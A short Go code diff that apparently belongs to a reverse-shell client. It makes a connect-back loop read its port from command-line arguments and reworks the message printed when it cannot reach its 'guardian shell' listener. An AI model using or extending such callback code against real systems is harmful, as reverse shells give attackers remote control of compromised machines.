@@ -17,13 +17,15 @@ const (
 )
 
 func main() {
+	port := utils.GetPortFromArgs()
+
 	for {
 
-		address := fmt.Sprintf("%s:%d", reverseIP, reversePort)
+		address := fmt.Sprintf("%s:%d", reverseIP, port)
 
 		conn, err := net.Dial("tcp", address)
 		if err != nil {
-			fmt.Printf("Error connecting to the guardian shell listner. Retrying in %d seconds...\n", retryDelay)
+			fmt.Printf("Error connecting to the guardian shell listner on port %d. Retrying in %d seconds...\n", port, retryDelay)
 			time.Sleep(time.Second * retryDelay)
 			continue
 		}
